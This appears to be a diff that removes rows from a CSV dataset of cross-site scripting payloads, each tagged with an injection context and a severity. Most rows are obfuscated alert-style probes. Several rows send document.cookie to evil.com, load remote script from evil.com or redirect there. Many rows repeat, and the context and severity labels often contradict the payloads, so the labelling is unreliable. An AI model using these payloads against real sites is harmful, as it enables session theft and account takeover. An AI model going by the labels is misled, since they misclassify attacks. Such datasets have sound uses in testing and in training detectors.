-' onerror=alert(1) x=',attribute,low
-"{{constructor.constructor(""alert(1)"")()}}",template_injection,medium
-"{{constructor.constructor(""confirm(1)"")()}}",event_handler,high
-#{alert(1)},template_injection,low
-javascript:confirm(document.domain),js_uri,low
-"setTimeout(""alert(1)"",0)",tag_injection,high
-"""><ImG SrC=X OnErRoR=AlErT(1)>",attribute,low
-"<ifr\u0061me src=""j\u0061v\u0061script:\u0061\u006cert(1)"">",tag_injection,medium
-"oNerRor=""alErT(1)""",html_body,medium
-<%= alert(1) %>,event_handler,high
-onload='alert(1)',attribute,medium
-' onerror=confirm(1) x=',template_injection,high
-<video src=x onerror=alert(1)>,event_handler,medium
-"""><svg onload=alert(1)>",attribute,medium
-onloaD='aLeRT(1)',attribute,medium
-<details open ontoggle=alert(1)>,event_handler,high
-' onerror=alert(1) x=',attribute,medium
-"data:text/html,<script>alert(1)</script>",js_uri,low
-"javascript:void(document.location=""http://evil.com"")",template_injection,low
-<img/src=x onerror=alert(1)//>,dom_sink,high
-javascript:confirm(1),js_uri,high
-""" onload=alert(1) x=""",attribute,high
-"document.body.innerHTML=""<img src=x onerror=confirm(1)>""",attribute,low
-"{{constructor.constructor(	""alert(	1)"")(	)}}",attribute,medium
-<details open ontoggle=alert(1)>,event_handler,medium
-' onmouseover=alert(1) ',attribute,high
-"\"" onerror=confirm(1)//",attribute_escape,high
-"document.write(	""<img src
-=x onerror
-=alert(	1)>"")",dom_sink,high
-"<object d\u0061t\u0061=""j\u0061v\u0061script:\u0061\u006cert(1)"">",tag_injection,low
-"<iframe src=""javascript:alert(1)"">",tag_injection,low
-' ><img src=x onerror=alert(1)>,attribute,low
-javascript:alert(document.domain),js_uri,low
-"document.body.innerHTML=""<img src=x onerror=alert(1)>""",dom_sink,medium
-javascript:alert(document.domain),js_uri,high
-"document.body.innerHTML=""<img src=x onerror=alert(1)>""",dom_sink,high
-<script>prompt(1)</script>,script_injection,medium
-<svg onload=alert(1)>,attribute,medium
-<script>al'+'ert(document.domain)</script>,script_injection,high
-"eval(""alert(1)"")",tag_injection,low
-\x3csvg/onload=alert(1)\x3e,tag_injection,medium
-<input onfocus=alert(1) autofocus>,event_handler,high
-<svg/onload=alert(1)>,tag_injection,high
-<marquee>d.innerHTML+='';</script>,html_body,high
-""" onload=alert(1) x=""",attribute,medium
-\' onerror=alert(1)//,attribute_escape,low
-<body onload=alert(1)>,event_handler,medium
-"document.write(""<img src=x onerror=confirm(1)>"")",dom_sink,high
-"setTimeout(""alert(1)"",0)",js_uri,low
-"<iframe src=""javascript:alert(1)"">",tag_injection,high
-"onbeforeinput=""alert(1)""",html_body,medium
-jAvAsCrIpT:CoNfIrM(1),js_uri,high
-\x3csvg onload=alert(1)\x3e,attribute_escape,medium
-jAvAsCrIpT:AlErT(1),js_uri,high
-${aLeRt(1)},template_injection,low
-"\"" onerror=alert(1)//",attribute_escape,medium
-"setTimeout(""alert(1)"",0)",dom_sink,high
-<img src=x onerror=al'+'ert(1)>,event_handler,low
-""" onload=alert(1) x=""",attribute,medium
-onload='confirm`1`',attribute,medium
-\' onerror=alert(1)//,attribute_escape,medium
-"document.body.innerHTML=""&lt;img src=x onerror=alert(1)&gt;""",dom_sink,medium
-&quot; onerror=alert(1) x=&quot;,attribute_escape,low
-${alert(1)},template_injection,low
-"data:text/html,<script>alert(1)</script>",js_uri,medium
-"javascript:void(document.location=""http://evil.com"")",tag_injection,medium
-"<iframe src=""javascr/**/ipt:alert(1)"">",tag_injection,low
-<marquee onstart=alert(1)>,event_handler,high
-&quot; onerror=alert(1) x=&quot;,attribute_escape,medium
-"{{constructor.constructor(""al'+'ert(1)"")()}}",template_injection,medium
-"document.write(""<img src=x onerror=alert(1)>"")",dom_sink,low
-"<ifr\u0061me src=""j\u0061v\u0061script:\u0061\u006cert(1)"">",tag_injection,low
-<video src=x onerror=alert(1)>,event_handler,low
-javascript:confirm(1),event_handler,high
-onloAD='AlErT(1)',attribute,medium
-"{{constructor.constructor(""alert(1)"")()}}",template_injection,high
-\' onerror=alert(1)//,attribute_escape,high
-"data:text/html,<script>alert(1)</script>",js_uri,high
-javascript:confirm(1),js_uri,low
-ONLoad='alErt(1)',html_body,medium
-<input onfocus=alert(1) autofocus>,event_handler,high
-%3Cscript%3Ealert(document.domain)%3C/script%3E,script_injection,high
-"\""><img src=x onerror=alert(1)>",attribute_escape,medium
-""" onfocus=alert(1) autofocus=""",attribute,medium
-<details open ontoggle=alert(1)>,event_handler,medium
-"\x3cembed src=""javascript:alert(1)""\x3e",tag_injection,medium
-<img src=x onerror=confirm(1)>,tag_injection,high
-javascript:confirm(1),attribute,low
-"javascript:void(document.location=""http://evil.com"")",js_uri,high
-<%= confirm(1) %>,template_injection,low
-<%= alert(1) %>,template_injection,low
-""" onerror=\u0061\u006cert(1) x=""",attribute,medium
-' onload=alert(1) x=',attribute,high
-"{{constructor.constructor(""alert(1)"")()}}",dom_sink,low
-""" onload=alert(1) x=""",attribute,low
-javascript:confirm(1),js_uri,high
-<svg onload=alert()>,attribute,medium
-<object>d.innerHTML+='';</script>,html_body,high
-<img/src=x onerror=alert(1)//>,attribute_escape,low
-"<object data=""javascript:alert(1)"">",tag_injection,high
-<script>confirm(1)</script>,script_injection,low
-"\""><img src=x onerror=alert(1)>",attribute_escape,high
-"eval(""alert(1)"")",dom_sink,medium
-<script>confirm(1)</script>,js_uri,medium
-<svg/onload=confirm(1)>,tag_injection,medium
-&quot; onerror=\u0061\u006cert(1) x=&quot;,attribute_escape,high
-""" onerror=al'+'ert(1) x=""",event_handler,low
-javascript:alert(document.domain),attribute,medium
-{{7*7}},template_injection,low
-"javascript:void(document.location=""http://evil.com"")",js_uri,low
-"eval(""alert(1)"")",dom_sink,low
-javascript:alert(1),js_uri,low
-<svg/onload=confirm(1)>,attribute,high
 "oNERROR=""alErT(1)""",html_body,medium
-onload='self.alert(1)',attribute,medium
-<body onload=alert(1)>,event_handler,high
-</tag><svg onload=alert(1)>,html_body,medium
-<script>alert(document.domain)</script>,script_injection,low
-<script>alert(document.domain)</script>,script_injection,low
-<SCRIPT>confirm(1)</SCRIPT>,script_injection,low
-<%= alert(1) %>,template_injection,high
-${alert(1)},template_injection,medium
-<SCRIPT>al'+'ert(1)</SCRIPT>,script_injection,low
-"document.write(""<img src=x onerror=alert(1)>"")",dom_sink,low
-<script>alert(document.domain)</script>,script_injection,medium
-"onmouseenter=""alert(1)""",html_body,medium
-<image src/onerror=alert(1)>,html_body,medium
-""" onerror=alert(1) x=""",attribute,high
-<body onload=confirm(1)>,event_handler,medium
-"<object data=""javaSCRIPT:alert(1)"">",tag_injection,low
-"setTimeout(""al'+'ert(1)"",0)",tag_injection,medium
-"data:text/html,<script>alert(1)</script>",js_uri,medium
-src=JaVaSCript:prompt`1`,url,medium
-<svg onload=alert(1)>,html_body,medium
-<svg/onload=alert(1)>,tag_injection,high
-{{7*7}},dom_sink,medium
-<SCRIPT>alert(1)</SCRIPT>,script_injection,medium
-OnloAD='aLeRT(1)',html_body,medium
-<script>prompt(1)</script>,script_injection,low
-<%00svg onload=alert()>,html_body,medium
-"<svG/x="">""/oNloaD=prompt`1`//",attribute,medium
-javascript:confirm(1),js_uri,low
-"<object data=""javascript:alert(1)"">",tag_injection,high
-jAvAsCrIpT:AlErT(1),js_uri,high
-"document.body.innerHTML=""\x3cimg src=x onerror=alert(1)\x3e""",dom_sink,medium
-<input onfocus=alert(1) autofocus>,event_handler,low
-"\"" onload=alert(1)//",dom_sink,medium
-"jAvAsCrIpT:VoId(dOcUmEnT.LoCaTiOn=""HtTp://eViL.CoM"")",script_injection,medium
-""" onload=alert(1) x=""",js_uri,high
-<script>confirm(	1)</script>,script_injection,high
-"{{constructor.constructor(	""alert(	1)"")(	)}}",template_injection,medium
-javaSCRIPT:alert(document.domain),js_uri,low
-"""><SvG OnLOAD=aLerT(1)>",attribute,medium
-${alert(	1)},template_injection,high
-<SCRIPT>prompt(1)</SCRIPT>,attribute,low
-\x3cbody onload=alert(1)\x3e,tag_injection,high
-""" onload=alert(1) x=""",attribute,low
-' onerror=alert(1) x=',script_injection,low
-<img/src=x onerror=alert(1)//>,event_handler,medium
-<svg/onload=alert(1)>,tag_injection,low
-"data:text/html,<SCRIPT>alert(1)</SCRIPT>",dom_sink,medium
-"setTimeout(""alert(1)"",0)",script_injection,low
-${alert(1)},dom_sink,low
-"\""><img src=x onerror=alert(1)>",script_injection,medium
-<svg onload=alert(1)>,event_handler,high
-<marquee onstart=alert(1)>,event_handler,high
-<ScRiPt>cOnFiRm(1)</sCrIpT>,attribute,high
-<script>confirm(1)</script>,attribute,low
-\' onerror=alert(1)//,attribute_escape,medium
-javascript:alert(	1),js_uri,medium
-j\u0061v\u0061script:confirm(1),js_uri,high
-<SCRIPT src=//evil.com/xss.js></SCRIPT>,dom_sink,low
-javascript:confirm`1`,url,medium
-"eval(""alert(1)"")",dom_sink,high
-j\u0061v\u0061script:\u0061\u006cert(1),js_uri,medium
-"<iframe src=""javascript:confirm(1)"">",tag_injection,medium
-"<iframe src=""javascript:alert(1)"">",tag_injection,low
-"\""\x3e\x3cimg src=x onerror=alert(1)\x3e",attribute_escape,low
-"location=""javascript:al'+'ert(1)""",dom_sink,low
-jAvAsCrIpT:CoNfIrM(1),dom_sink,low
-#{alert(1)},template_injection,high
-"eval(""alert(1)"")",dom_sink,high
-"onload=""top.alert(1)""",html_body,medium
-javaSCRIPT:confirm(1),js_uri,medium
-"setTimeout(""alert(1)"",0)",dom_sink,high
-' onerror=alert(1) x=',attribute,high
-"\' onerror
-=alert(	1)//",js_uri,low
-<img/src=x onerror=confirm(1)//>,dom_sink,high
-"jAvAsCrIpT:VoId(dOcUmEnT.LoCaTiOn=""HtTp://eViL.CoM"")",js_uri,medium
-"data:text/html,<script>alert(1)</script>",js_uri,high
-"document.body.innerHTML=""<img src=x onerror=alert(1)>""",dom_sink,medium
-"\"" onerror=alert(1)//",attribute_escape,high
-&quot; onerror=alert(1) x=&quot;,attribute_escape,high
-"//"";top.alert(1))",html_body,high
-"lOcAtIoN=""jAvAsCrIpT:AlErT(1)""",tag_injection,medium
-javascript:alert(document.domain),js_uri,medium
-prompt(1),attribute,medium
-javascript:confirm(1),attribute,low
-"<iframe src=""javascript:alert(1)"">",tag_injection,medium
-<script>\u0061\u006cert(1)</script>,script_injection,high
-\x3cinput onfocus=alert(1) autofocus\x3e,event_handler,medium
-"\"" onerror=alert(1)//",attribute_escape,medium
-<marquee onstart=alert(1)>,attribute_escape,low
-"<svg
- onload=alert()>",html_body,medium
-javascript:alert(	document.domain),js_uri,medium
-"location=""javascript:confirm(1)""",dom_sink,medium
-<SCRIPT src=//evil.com/xss.js></SCRIPT>,script_injection,medium
-<input onfocus=alert(1) autofocus>,attribute_escape,high
-"eval(""confirm(1)"")",event_handler,high
-"javascript:void(document.location=""http://evil.com"")",js_uri,low
-"<vIdeO
-><sourCe onerror=""['al\u0065'+'rt'][0]['\x63onstructor']['\x63onstructor']('return this')()[['al\u0065'+'rt'][0]]([String.fromCharCode(8238)+[!+[]+!+[]]+[![]+[]][+[]]])"">",html_body,high
-<BODY ONLOAD=alert(’XSS’)>,html_body,medium
-<video src=x onerror=\u0061\u006cert(1)>,attribute,low
-"{{constructor.constructor(""alert(1)"")()}}",js_uri,high
-#{alert(1)},template_injection,high
-<script>confirm(1)</script>,script_injection,medium
-<marquee onstart=alert(1)>,js_uri,medium
-' onerror=alert(1) x=',event_handler,medium
-&quot; onerror=confirm(1) x=&quot;,attribute_escape,medium
-javascript:confirm(1),js_uri,low
-"data:text/html,<script>alert(1)</script>",js_uri,high
-"#""><svg onload=alert(1)>",html_body,medium
-"""><svg onload=prompt`1`>",html_body,medium
-"eval(""alert(1)"")",dom_sink,low
-\' onerror=alert(1)//,attribute_escape,low
-javascript:alert(1),js_uri,medium
-"<img src
-=x onerror
-=alert(	1)>",tag_injection,low
-' onmouseover=alert(1) ',attribute,medium
-"javascript:void(document.location=""http://evil.com"")",js_uri,medium
-"""><img src=x onerror=alert(1)>",attribute,medium
-"document.body.innerHTML=""<img src=x onerror=\u0061\u006cert(1)>""",dom_sink,high
-<Svg onloAD=alErt()>,html_body,medium
-javascript:alert(document.domain),js_uri,high
-#{alert(1)},tag_injection,medium
-${al'+'ert(1)},template_injection,medium
-' onerror=alert(1) x=',attribute,medium
-<body onload=alert(1)>,event_handler,high
-javascript:confirm(1),js_uri,low
-<svg/onload=al'+'ert(1)>,attribute_escape,high
-<img src=x onerror=confirm(1)>,event_handler,low
-javascript:alert(1),js_uri,low
-"\""><img src=x onerror=alert(1)>",attribute_escape,high
-"eval(""confirm(1)"")",dom_sink,medium
-<script>prompt(1)</script>,js_uri,high
 "ONlOAd=""ALErt(1)""",html_body,medium
-"\""><iMg sRc=x oNeRrOr=aLeRt(1)>",event_handler,low
-<input onfocus=confirm(1) autofocus>,event_handler,high
-&lt;img src=x onerror=alert(1)&gt;,tag_injection,low
-<video src=x onload=alert(1)>,event_handler,high
-"javascript:void(document.location=""http://evil.com"")",js_uri,low
-<script>confirm(1)</script>,script_injection,high
-\' onerror=alert(1)//,attribute_escape,high
-""" onload=alert(1) x=""",attribute,medium
-""" onfocus=alert(1) autofocus=""",attribute,low
-javascript:alert(1),attribute,low
-<script>alert(1)</script>,script_injection,high
-<img src=x onerror=confirm(1)>,attribute,low
-<img/src=x onerror=alert(1)//>,event_handler,low
-"\""><img src=x onerror=\u0061\u006cert(1)>",attribute_escape,low
-"{{constructor.constructor(""alert(1)"")()}}",template_injection,high
-<svg onload=alert()>,html_body,medium
-"<object data=""javascript:alert(1)"">",tag_injection,low
-<SCRIPT>alert(1)</SCRIPT>,template_injection,low
-""" onfocus=alert(1) autofocus=""",attribute,low
-"document.write(""<img src=x onerror=alert(1)>"")",attribute,low
-<video src=x onload=alert(1)>,event_handler,low
-"{{constructor.constructor(""alert(1)"")()}}",template_injection,high
-"&lt;script&gt;document.location=""http://evil.com/?c=""+document.cookie&lt;/script&gt;",script_injection,low
-' onmouseover=\u0061\u006cert(1) ',attribute,low
-onerror='alert(1)',html_body,medium
-"<script>document.location=""http://evil.com/?c=""+document.cookie</script>",script_injection,low
-"<details>d.innerHTML+='';</script>//[""'`-->]]>]</div>",attribute,high
-"<script>document.location=""http://evil.com/?c=""+document.cookie</script>",script_injection,high
-"\"" onerror=alert(1)//",attribute_escape,low
-#{alert(1)},template_injection,medium
-"setTimeout(""alert(1)"",0)",dom_sink,high
-javascript:confirm(1),js_uri,medium
-"<iframe src=""javascript:al'+'ert(1)"">",tag_injection,high
-"\"" OnErRoR=AlErT(1)//",dom_sink,low
-"<object data
-=""javascript:alert(	1)"">",tag_injection,low
-"<object data=""javaSCRIPT:alert(1)"">",event_handler,high
-""" onload=alert(1) x=""",attribute,low
-' onerror=alert(1) x=',js_uri,medium
-"eval(""confirm(1)"")",dom_sink,low
-%3Csvg/onload=alert(1)%3E,js_uri,medium
-"\""><img src=x onerror=al'+'ert(1)>",attribute_escape,high
-onerror=alert(0);>,html_body,medium
-<svg onload=confirm(1)>,html_body,medium
-' ><img src=x onload=alert(1)>,attribute,low
-<%00script>d.innerHTML+='';</script>,html_body,high
-\x3cscript\x3eprompt(1)\x3c/script\x3e,script_injection,low
-""" onload=alert(1) x=""",attribute,medium
-"document.body.innerHTML=""<img src=x onerror=alert(1)>""",dom_sink,low
-\' onerror=alert(1)//,attribute_escape,medium
-"< script>d.innerHTML+='';</script>//[""'`-->]]>]</div>",attribute,high
-<svg/onload=alert(1)>,tag_injection,low
-"<object data=""javascript:alert(1)"">",tag_injection,low
-"data:text/html,<script>alert(1)</script>",js_uri,high
